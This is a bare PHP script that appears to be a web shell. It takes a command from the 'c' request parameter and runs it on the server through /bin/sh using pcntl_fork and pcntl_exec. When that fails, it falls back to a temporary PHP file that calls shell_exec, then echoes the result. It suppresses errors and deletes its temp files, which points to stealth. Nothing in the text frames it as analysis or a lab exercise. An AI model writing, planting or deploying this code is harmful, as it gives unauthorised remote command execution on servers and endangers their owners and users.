<?php
error_reporting(0);

$cmd = $_GET['c'] ?? $_POST['c'] ?? '';

if (!empty($cmd)) {
    $output_file = '/tmp/out_' . rand(100000, 999999) . '.txt';

    // PCNTL Method
    if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
        $pid = pcntl_fork();
        if ($pid == 0) {
            pcntl_exec('/bin/sh', ['-c', $cmd . " > $output_file 2>&1"]);
            exit(0);
        }
        sleep(2);
    }

    // Read Output
    $output = "";
    if (file_exists($output_file)) {
        $output = file_get_contents($output_file);
        @unlink($output_file);
    }

    // Fallback using error_log + temp file
    if (empty(trim($output)) && function_exists('error_log')) {
        $tmp = '/tmp/cmd_' . rand(1000,9999) . '.php';
        file_put_contents($tmp, "<?php echo shell_exec('" . addslashes($cmd) . " 2>&1'); ?>");
        ob_start();
        include($tmp);
        $output = ob_get_clean();
        @unlink($tmp);
    }

    if (!empty(trim($output))) {
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "No output";
    }
}
?>
